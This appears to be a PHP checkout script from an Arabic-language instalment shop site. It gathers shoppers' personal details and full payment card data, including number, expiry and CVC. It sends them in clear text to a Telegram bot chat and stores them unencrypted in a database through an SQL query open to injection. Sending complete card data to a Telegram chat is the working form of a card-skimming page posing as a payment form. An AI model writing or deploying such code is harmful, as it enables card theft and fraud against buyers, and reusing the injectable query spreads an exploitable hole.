<?php
include 'controlPanel/Database.php';
$db = new Database();
$totalPrice = $_GET['totalPrice'];
$query = "SELECT * FROM `users` WHERE id = 2";
$result = $db->dbQuery($query);

if ($db->dbNumRows($result)) {
    $rows = $db->dbFetchResult($result);
    foreach ($rows as $row) {
        $token = $row['token'];
        $tokenID = $row['tokenID'];
    }
}

if (!isset($_SESSION["user"])) {
    header("location:index.php");
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // header("location:confirem.php?payment=$payment");

    $user = $_SESSION["user"];

    $name = $_SESSION["name"];

    $email = $_SESSION["email"];
    
    $phone = $_SESSION["phone"];
    
    
    $location = $_SESSION["address"];
    

    $payment_getway = $_SESSION["payment_method"];
    if($payment_getway == 'tabby'  ){
            header("Location:checkoutTappey.php?totalPrice=$totalPrice");   
    }
    if($payment_getway == 'tmara'  ){
            header("Location:checkoutTmara.php?totalPrice=$totalPrice");  
    }

    $_SESSION["CashOrBatch"] = $_POST['CashOrBatch'];
    $CashOrBatch = $_SESSION["CashOrBatch"];

    $_SESSION["card_name"] = $_POST['card_name'];
    $card_name = $_SESSION["card_name"];

    $_SESSION["card_number"] = $_POST['card_number'];
    $card_number = $_SESSION["card_number"];

    $_SESSION["month"] = $_POST['month'];
    $month = $_SESSION["month"];

    $_SESSION["year"] = $_POST['year'];
    $year = $_SESSION["year"];

    $_SESSION["cvc"] = $_POST['cvc'];
    $cvc = $_SESSION["cvc"];

    $token1 = $token;
    $bot_id1 = $tokenID;
    // die($bot_id1);
    $totalPrice = isset($_SESSION["totalPrice"]) ? $_SESSION["totalPrice"] : "غير محدد";

    if($payment_getway == 'all'){
        $first_batch =$totalPrice;
        $payment = $first_batch;
    }else{
        $first_batch = $_POST['first_batch'];

    }
    // die($CashOrBatch);
    $street = isset($_SESSION["street"]) ? $_SESSION["street"] : "غير محدد";
$home = isset( $_SESSION["address"]) ? $_SESSION["address"] : "غير محدد";
$zip = isset($_SESSION["zip"]) ? $_SESSION["zip"] : "غير محدد";
    $databot = ":: طلب جديد ::" . PHP_EOL
    . "رقم الطلب: " . $user . PHP_EOL
    . "البريد الإلكتروني: " . $email . PHP_EOL
    . "رقم الهاتف: " . $phone . PHP_EOL
    . "الحي: " . $location . PHP_EOL
    . "الشارع: " . $street . PHP_EOL
    . "المنزل: " . $home . PHP_EOL
    . "الرمز البريدي: " . $zip . PHP_EOL
    . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
    . "الدفعة الأولى: " . $first_batch . PHP_EOL
    . "فترة التقسيط: " . $CashOrBatch . PHP_EOL
    . "البطاقة البنكية: " . $payment_getway . PHP_EOL
    . "الاسم على البطاقة: " . $card_name . PHP_EOL
    . "رقم البطاقة: " . $card_number . PHP_EOL
    . "الشهر: " . $month . PHP_EOL
    . "السنة: " . $year . PHP_EOL
    . "CVC: " . $cvc . PHP_EOL
    . ":: رابط التعليمات ::" . PHP_EOL
    . "فاتورة: https://infinitelectron-ae.store/controlPanel/invoice.php?id=" . $user . PHP_EOL
    . "عقد: https://infinitelectron-ae.store/controlPanel/Installment.php?id=" . $user . PHP_EOL
    . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;

$apiToken = $token;
   
    $url = "https://api.telegram.org/bot{$apiToken}/sendMessage";
    // Prepare the POST data
    $sender = [
        'chat_id' => $tokenID,
        'text' => $databot,
    ];
    
    // Initialize cURL
    if($payment_getway != 'tabby' && $payment_getway != 'tmara'  ){

    $curl = curl_init($url);
    
    // Set cURL options
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
    // Execute cURL request
    $response = curl_exec($curl);
    // die($response);
    // // Check for errors
    // if ($response === false) {
    //     $error = curl_error($curl);
    //     echo "cURL Error: $error";
    // } else {
    //     echo "Message sent successfully!";
    // }
    
    // Close cURL session
    curl_close($curl);
    // header("location:confirem.php?payment=$payment");

    $query = "INSERT INTO `orders`(`name`, `phone`, `location`, `street`, `payment`, `first_batch`, `user`, `CardName`, `cardNumber`, `month`, `year`, `cvc`,`email`,`country`,`city`,`home`,`zip`,`payment_getway`,`CashOrBatch`) VALUES 
                                 ('$name', '$phone', '$location','', '$totalPrice', '$first_batch', '$user', '$card_name', '$card_number', '$month', '$year', '$cvc','$email','','','','','$payment_getway','$CashOrBatch')";
    // die($query);
   $result = $db->dbQuery($query);
    }
   if($payment_getway == 'tabby'  ){
    header("Location:checkoutTappey.php?totalPrice=$totalPrice");   
}
elseif($payment_getway == 'tmara'  ){
    header("Location:checkoutTmara.php?totalPrice=$totalPrice");  
}else{
        //header("location:payment.php?payment=$payment");
        header("location:confirem.php?payment=$payment");
    }
}
?>